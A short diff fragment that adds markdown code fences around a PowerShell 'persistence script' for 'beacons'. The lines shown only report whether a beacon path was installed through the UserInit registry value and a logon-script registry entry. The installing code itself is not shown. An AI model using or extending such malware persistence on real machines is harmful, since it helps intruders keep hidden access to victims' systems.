@@ -1,3 +1,4 @@
+```Powershell
 # PowerShell persistence script
 
 # Define beacon paths
@@ -121,3 +122,4 @@ Write-Host "5. UserInit Registry: " -NoNewline
 if ($userInitCurrent.Contains($beaconPaths[0])) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
 Write-Host "6. Logon Script Registry: " -NoNewline
 if ($logonScript) { Write-Host "INSTALLED" -ForegroundColor Green } else { Write-Host "FAILED" -ForegroundColor Red }
+```
